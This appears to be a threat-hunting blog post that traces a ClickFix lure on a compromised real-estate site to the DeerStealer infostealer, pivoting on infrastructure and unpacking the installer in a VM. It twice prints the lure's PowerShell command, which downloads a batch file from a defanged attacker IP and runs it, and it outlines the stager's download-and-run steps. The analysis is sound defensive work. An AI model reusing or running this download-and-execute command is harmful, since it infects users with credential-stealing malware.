---
layout: post
title:  "Comp'd Domain - DeerStealer"
date:   2025-09-09 21:00:00 +1000
categories: hunting
---

<style>
  body { font-size: 16px; }
  body {font-family: 'Inter', sans-serif}
  h1 { font-size: 19px !important; }
  h2 { font-size: 17px !important; }
  h3 { font-size: 15px !important; }
</style>

## Overview

Grabbed a Clickfix IOC from Validin, following the breadcrumbs to see if I can attribute it to an adversary/malware strain.

Going to through out all IOCs and stuff because why not.

### Website serving Clickfix

"quirkyrealty[.]com"

Resolves to an Indian IP. Hosted by 'Web Werks India Pvt. Ltd. was an Indian data center and cloud solutions provider'
![alt text](/images/india_resolved.PNG)

Google dork see what we can get. Looks like a legit business? Well a not very legit one. 
![alt text](/images/quirky_google.PNG)

Booting up my VM to hit the website to see how this is being served.

![alt text](/images/landing_page.PNG)

Alright few points here from the screenshot above.
- No redirects/iframes/weird JS
- Malicious JavaScript exists within the first HTTP request to the domain
- Payload command written in cleartext (whoop whoop)
- Can see a juicy IP and the file 'ct.bat' that is downloaded from there.

![alt text](/images/malicious_js.PNG)

Here is the malicious .JS that copies the command to the user's clipboard
- Uses document.execCommand

Website is likely full comp'd or not legit in the first place.

Here is the full command from the ``command`` variable in the .JS

``const command = `powershell -c "Invoke-WebRequest -Uri 'hXXp://80[.]253[.]249[.]186:5504/ct.bat' -OutFile \"%temp%\ct.bat\" -UseBasicParsing; Start-Process \"%temp%\ct.bat\""`;``

### .Bat? 

``const command = `powershell -c "Invoke-WebRequest -Uri 'hXXp://80[.]253[.]249[.]186:5504/ct.bat' -OutFile \"%temp%\ct.bat\" -UseBasicParsing; Start-Process \"%temp%\ct.bat\""`;``

This is our payload command. Lets remove 'Start-Process', the const declaration and run it in my VM to save the file in temp.

``Invoke-WebRequest -Uri "hXXp://80[.]253[.]249[.]186:5504/ct.bat" -OutFile "C:\Users\ronald\Desktop\NewClicky\safe-file.txt"``

Alright well this is depressing. The file doesn't live on the web server anymore.

![alt text](/images/file_down.PNG)

But if we whack the IP into VT and check communicating files we may be able to see a communicating file that is active.

![alt text](/images/vt_file_comm.PNG)

Now let's have a go at pulling this from the same port. As 'hj.bat' was seen today (22nd Sept)

![alt text](/images/HJ.PNG)

Success! Wooo hooo. Alright let's break this down.

1. Launches powershell, then cmd
2. Sets variables for stage 2 download. (File, IP and Target Directory)
3. Attempts to use curl to download the .msi file
4. If it fails uses inbuilt powershell command WebClient to download
5. Runs the .msi file

### .Msi?

So let's pull it down. Using curl. As thats what the script does. Except we don't want to run it, clearly.

![alt text](/images/pull_second.PNG)

Easy peasy. Let's open this up, safely, of course. 

![alt text](/images/file_size.PNG)

Got a hash. 4.1mbs of size. See what VT says.

![alt text](/images/vt_result_deer.PNG)
![alt text](/images/yara_deer.PNG)

YARA rules are hitting for Deer Stealer. Never heard of that before.

Looks like it's MaaS again. Malware developed and maintained by the user @LuciferXfiles. 

Looks to behave like every other Infostealer. Jump in snatch and grab, exfil data, setup a C2.

Lets try and pick this apart.

### DeerStealer

Lets see how deep this goes. 

![alt text](/images/msi_extract_result.PNG)

First off I've ran msiexec in administrative mode to extract the contents of the installer without executing it.

![alt text](/images/msi_exec_files.PNG)

Now, we have four files to play around with. Most of the juice is in ``weav.wsvl`` However, that is not in a readable format.

So let's start with the .dll and see what we can find.

![alt text](/images/nfapi_vt.PNG)

It's known malicious. Cool, can confirm we are on the right rack.

After running strings on the .dll we get some interesting findings. 

Strings output

### IP? What are you...

We can see that 'ct.bat' is being served from the IP 80[.]253[.]249[.]186 at port 5504. 

Quick DNSLytics lookup.
![alt text](/images/clickfix_payload_ip.PNG)

What services are running on the IP?

![alt text](/images/shodan_result.PNG)

Fair few... that RCE CVE is juicy...

Anyhow, interesting that we can't see port 5504 here. Because that is the port that historically served 'ct.bat'

Hunt.io states it was last seen on the 9th of September. So I am one day late to the party. 

![alt text](/images/hunt.io_result.PNG)

Without any HTTP response body we can't do much else. Historical data is dry for this port on Censys, Validin and huntio.

For pivoting I'll look into RDP (3389)

A popular pivot from here is the SSL cert SHA_256 hash. Usually you would have to run an OpenSSL command to calculate this. But Validin has already calculated it for us.

![alt text](/images/validin_sha_256.PNG)

Now when we search this hash we have another IP.

![alt text](/images/validin_sha_result.PNG)

Snazzy. This gives us very high confidence they're related as they use the same RDP SSL cert!

Alright, when I whack this IP into VT I get some cool results.

![alt text](/images/VT_result.PNG)
